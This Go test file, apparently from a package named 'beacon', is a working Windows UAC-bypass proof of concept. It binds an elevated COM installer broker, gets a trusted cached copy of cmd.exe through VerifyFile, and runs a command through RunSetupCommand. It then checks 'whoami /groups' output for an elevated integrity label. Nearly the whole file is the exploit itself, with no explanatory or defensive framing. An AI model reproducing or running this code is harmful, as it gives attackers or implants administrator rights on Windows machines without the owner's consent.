package beacon

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"
	"unsafe"
)

func TestDbgCmdPath(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	r1, _, _ := procCoInitializeSecurity.Call(0, 0xFFFFFFFF, 0, 0, 2, 3, 0, 0, 0)
	t.Logf("CoInitializeSecurity -> 0x%08x", uint32(r1))

	broker, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "9AEA8A59-E0C9-40F1-87DD-757061D56177")
	if err != nil {
		t.Fatalf("broker bind: %v", err)
	}
	brokerI := (*ieaAdminBrokerIface)(broker)
	defer comRelease(broker)

	var uuidBstr uintptr
	r1, _, _ = syscall.Syscall9(brokerI.lpVtbl.InitializeAdminInstaller, 4, uintptr(broker), 0, 0, uintptr(unsafe.Pointer(&uuidBstr)), 0, 0, 0, 0, 0)
	if r1 != 0 {
		t.Fatalf("InitializeAdminInstaller 0x%08x", uint32(r1))
	}
	defer procSysFreeString.Call(uuidBstr)

	iidInst2, _ := guidFromString("BC0EC710-A3ED-4F99-B14F-5FD59FDACEA3")
	var inst unsafe.Pointer
	r1, _, _ = syscall.Syscall(brokerI.lpVtbl.QueryInterface, 3, uintptr(broker), uintptr(unsafe.Pointer(&iidInst2)), uintptr(unsafe.Pointer(&inst)))
	if r1 != 0 {
		t.Fatalf("QI IEAxiInstaller2 0x%08x", uint32(r1))
	}
	instI := (*ieaInstallBrokerIface)(inst)
	defer comRelease(inst)

	iidUnk, _ := guidFromString("00000000-0000-0000-C000-000000000046")

	verify := func(label, file string) (string, uint32) {
		fb := sysAllocStringPtr(mustUTF16(file))
		defer procSysFreeString.Call(fb)
		var cacheBstr uintptr
		var certLen uint32
		var certPtr unsafe.Pointer
		r1, _, _ = syscall.Syscall12(instI.lpVtbl.VerifyFile, 12,
			uintptr(inst), uuidBstr, 0xFFFFFFFFFFFFFFFF, fb, fb, 0,
			1, 0x10, uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&cacheBstr)),
			uintptr(unsafe.Pointer(&certLen)), uintptr(unsafe.Pointer(&certPtr)))
		var path string
		if cacheBstr != 0 {
			path = bstrToString(cacheBstr)
			procSysFreeString.Call(cacheBstr)
		}
		t.Logf("VerifyFile[%s] -> 0x%08x cache=%s", label, uint32(r1), path)
		return path, uint32(r1)
	}

	cmdPath, hr := verify("cmd", `C:\Windows\System32\cmd.exe`)
	if hr != 0 {
		t.Fatalf("cmd rejected")
	}
	runSetup := func(label, cmdLine string) uint32 {
		cmdB := sysAllocStringPtr(mustUTF16(cmdLine))
		defer procSysFreeString.Call(cmdB)
		emptyB := sysAllocStringPtr(mustUTF16(""))
		defer procSysFreeString.Call(emptyB)
		workdirB := sysAllocStringPtr(mustUTF16(os.Getenv("TEMP")))
		defer procSysFreeString.Call(workdirB)
		var ph uintptr
		r1, _, _ := syscall.Syscall12(instI.lpVtbl.RunSetupCommand, 9,
			uintptr(inst), uuidBstr, 0, cmdB, emptyB, workdirB, emptyB, 4, uintptr(unsafe.Pointer(&ph)), 0, 0, 0)
		t.Logf("RunSetupCommand[%s] -> 0x%08x", label, uint32(r1))
		return uint32(r1)
	}

	outFile := filepath.Join(os.Getenv("TEMP"), "uac-cmd.out")
	os.Remove(outFile)
	markerFile := filepath.Join(os.Getenv("TEMP"), "uac-cmd.marker")
	os.Remove(markerFile)

	cmdLine := cmdPath + " /c whoami /groups > \"" + strings.ReplaceAll(outFile, "\\", "/") + "\" & echo done > \"" + strings.ReplaceAll(markerFile, "\\", "/") + "\""
	t.Logf("cmdLine: %s", cmdLine)
	hr = runSetup("cmd-schtasks", cmdLine)

	deadline := 0
	for deadline < 40 {
		if _, err := os.Stat(markerFile); err == nil {
			break
		}
		deadline++
		time.Sleep(500 * time.Millisecond)
	}
	if data, err := os.ReadFile(outFile); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.Contains(line, "Mandatory Label") {
				t.Logf("ELEVATED RUNNER: %s", line)
			}
		}
	} else {
		t.Log("no output file")
	}
	fmt.Println("done")
}
